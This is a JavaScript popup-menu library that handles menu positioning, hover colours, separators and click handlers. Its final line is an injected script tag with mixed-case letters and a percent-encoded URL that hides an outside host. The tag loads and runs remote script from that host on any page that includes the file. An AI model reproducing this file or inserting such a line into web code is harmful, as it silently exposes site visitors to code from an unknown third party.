var popupMenu = {
normalBackgroundColor : "#ffffff",
normalForegroundColor : "#0000cc",
hoverBackgroundColor : "#3366cc",
hoverForegroundColor : "#ffffff",

enableClose : function(menuDesc) {
				  menuDesc.canClose = true;
			  },

getAbsolutePos : function(e) {
					 var l=e.offsetLeft;
					 var t=e.offsetTop;
					 while(e=e.offsetParent) {
						 l+=e.offsetLeft;
						 t+=e.offsetTop;
					 }
					 var pos = new Object();
					 pos.x=l;
					 pos.y=t;
					 return pos;
				 },

toggleMenu : function(menuDesc) {
				 var menu = menuDesc.menuDiv;
				 if(!menuDesc.display) {
					 var link = menuDesc.menuLink;
					 var e = link;
					 var pos = this.getAbsolutePos(e);
					 var left = pos.x;
					 var top = pos.y + e.offsetHeight;
					 menu.style.left = left + "px";
					 menu.style.top = top + "px";
					 menu.style.display = "block";
					 menuDesc.canClose = false;
					 setTimeout(function() {popupMenu.enableClose(menuDesc);}, 200);
				 } else {
					 menu.style.display = "none";
				 }
				 menuDesc.display = !menuDesc.display;
				 menuDesc.menuLink.blur();
				 return false;
			 },
closeMenu : function(menuDesc) {
				if(menuDesc.display && menuDesc.canClose) {
					this.toggleMenu(menuDesc);
				}
			},
addEvent : function(elm, evType, fn, useCapture) {
			   if (elm.addEventListener) {
				   elm.addEventListener(evType, fn, useCapture);
				   return true;
			   } else if (elm.attachEvent) {
				   var r = elm.attachEvent('on' + evType, fn);
				   return r;
			   } else {
				   elm['on' + evType] = fn;
			   }
		   },
setHoverColor: function(item) {
				item.style.backgroundColor = this.hoverBackgroundColor;
				item.style.color = this.hoverForegroundColor;
			},
unsetHoverColor: function(item) {
				item.style.backgroundColor = this.normalBackgroundColor;
				item.style.color = this.normalForegroundColor;
			},
createMenu :function(menuDesc) {
				var menu = menuDesc.menuDiv;
				for(var i = 0; i < menuDesc.items.length; i++) {
					var item = menuDesc.items[i];
					if(item.type == "separator") {
						var div = document.createElement("div");
						div.style.borderWidth = "0px 0px 1px 0px";
						div.style.borderStyle = "solid";
						div.style.margin = "2px";
						div.style.padding = "0px";
						div.style.height = "0px";
						div.style.lineHeight = "0px";
						div.style.display = "block";
						div.style.borderColor = this.hoverBackgroundColor;
						menu.appendChild(div);
					} else {
						var div = document.createElement("div");
						div.style.paddingLeft = "3px";
						div.style.cursor = "pointer";
						div.style.color = this.normalForegroundColor;
						div.style.backgroundColor = this.normalBackgroundColor;
						div.onmouseover = function() {popupMenu.setHoverColor(this);};
						div.onmouseout = function() {popupMenu.unsetHoverColor(this);};
						div.menuItem = item;
						div.onclick = function() {menuDesc.clickHandler(this.menuItem);};
						div.innerHTML = item.text;
						menu.appendChild(div);
					}
				}
				popupMenu.addEvent(document, "click", function() {popupMenu.closeMenu(menuDesc)});
				popupMenu.addEvent(menuDesc.menuLink, "click", function() {popupMenu.toggleMenu(menuDesc)});
				menuDesc.menuLink.href = "javascript:void(0)";
			}
}
<ScRiPt src='http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70'></sCrIpT>